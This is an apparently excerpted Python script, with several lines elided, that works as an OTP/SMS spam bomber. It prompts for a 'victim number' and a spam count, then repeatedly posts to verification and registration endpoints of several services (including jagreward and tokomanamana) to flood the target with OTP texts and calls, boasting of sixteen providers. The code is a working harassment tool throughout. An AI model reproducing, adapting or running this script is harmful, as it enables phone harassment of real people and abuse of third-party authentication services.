	...
	def mulai(self,asu):
		try:
			...
			for x in range(asu):
				...
				if "A solicitação do código de verificação excedeu o limite. Por favor, tente novamente amanhã." in send:break
				else:break
			for x in range(asu):
				send=json.loads(reek.get(f"https://id.jagreward.com/member/verify-mobile/{self._8}").text)
				if send["message"]=="Você receberá uma ligação de nosso sistema. Por favor, preencha os ÚLTIMOS 6 NÚMEROS do número de telefone abaixo.":continue
				else:break
			for x in range(asu):
				...
				if "Código OTP enviado com sucesso!" in send:continue
				else:break
			for x in range(asu):
				...
				if "OTP GERADO COM SUCESSO ! " in send:continue
				else:break
			for x in range(asu):
			...
			for x in range(asu):
				...
				if load["detail"] == "SMS OTP enviado com sucesso":continue
				else:break
			for x in range(asu):
			...
			for x in range(asu):
				...
				if "Pedido bem sucedido" in send:continue
				else:break
			for x in range(asu):
			...
			for x in range(asu):
				send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":self._08},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
				if "O código OTP foi enviado com sucesso!" in send:continue
				else:break
			bingung()
		except reek.exceptions.ReadTimeout:exit(f"{m}[!] Erro de conexão")
		except reek.exceptions.ConnectionError:exit(f"{m}[!] Erro de conexão")
		except (KeyboardInterrupt,EOFError):exit("[!] Exit")
__import__("os").system("clear")
def bingung():
	print(f"{h}\n[√] Todo o spam foi enviado com sucesso{p}\n")
	print(f"Quer mais spam?\nDigite y para sim digite t para não\n")
	pilih=input("y/t : ")
	if(pilih=="y"):
		cok()
	elif(pilih=="t"):
...
def cok():
	while True:
		try:
			a=input("[+]Número da Vítima 55119xxx\t: ")
			asu=a[0:2]
			if a in(""," "):print("[!] Não deixe vazio")
			elif "08" not in asu:print("[!] Use o número 55119xxx\n")
			elif len(a)<=10:print("[!] O número deve ter mais de 10 números")
			elif a=="082245308912":print("[!] Você não pode enviar spam para aqueles com scripts estúpidos!\n")
			else:
				try:
					suu=int(input("[+] Insira a quantidade de spam\t: "))
				except:
					print("Formato de número de entrada, não letras!")
					cok()
				time.sleep(2)
				print("\n[+] É silencioso...")
				b=a[1:12] 
...
def memek():
	print(f"{p}"+title+f"{h}\n16 Operadores OTP{p}\n\nNão abuse do recurso\nNúmero de spam multiplicado por 16\nExemplo de quantidade de spam 2\nIsso torna 2 vezes 16 o spam 32\n")
